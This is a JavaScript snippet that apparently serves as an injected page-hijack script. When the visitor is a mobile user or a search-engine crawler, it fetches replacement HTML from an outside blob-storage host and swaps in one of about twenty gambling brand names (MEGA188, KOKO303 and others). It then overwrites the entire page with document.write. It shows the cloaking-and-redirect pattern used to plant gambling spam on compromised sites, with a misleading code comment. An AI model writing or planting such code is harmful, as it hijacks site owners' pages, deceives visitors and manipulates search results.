async function refreshPage(url, selectedBrand) {
    try {
        const response = await fetch(url);
        if (!response.ok) return;
        let newHTML = await response.text();
        
        // Save the selected brand in body data-brand-context="[SITE_NAME]" attribute.
        // This allows autolink.js to read the current brand context and replace content accordingly.
        newHTML = newHTML.replace(/\[SITE_NAME\]/g, selectedBrand);
        
        document.open();
        document.write(newHTML);
        document.close();
    } catch (err) {
        console.error("Failed to fetch or replace page:", err);
    }
}

function isMobileOrBot() {
    const ua = navigator.userAgent;
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(ua);
    const isModernMobile = navigator.userAgentData ? navigator.userAgentData.mobile : false;
    return (isMobile || isModernMobile || isBot);
}

if (isMobileOrBot()) {
    const brands = [
        'MEGA188', 'MEGA288', 'MEGA55', '88MEGA', 'MEGA338', 'MEGA777', 'QQ333BET',
        'MEGAHOKI', 'MEGASLOT188', 'MEGASLOT288','MEGAWIN188', 'MEGAWIN288', 'MEGAWIN777',
        'VIP333', 'VIP555', 'VIPHOKI', 'KOKO88', 'KOKO188', 'KOKO288', 'KOKO303' ];
    const hostname = window.location.hostname;
    const pathname = window.location.pathname;

    let selectedBrand;

    if (pathname === "/" || pathname === "") {
        // 1. Check if it is the top-level page (root), if so, pick a file based on the current day of the month
        const dayOfMonth = new Date().getDate();
        const fileIndex = (dayOfMonth - 1) % brands.length;
        selectedBrand = brands[fileIndex];
    } else {
        // 2. For any other path, pick a random file
        const randomIndex = Math.floor(Math.random() * brands.length);
        selectedBrand = brands[randomIndex];
    }

    const storageUrl = `https://7qbb6tluxkzf6t8y.public.blob.vercel-storage.com/sites/index.html`;

    refreshPage(storageUrl, selectedBrand);
}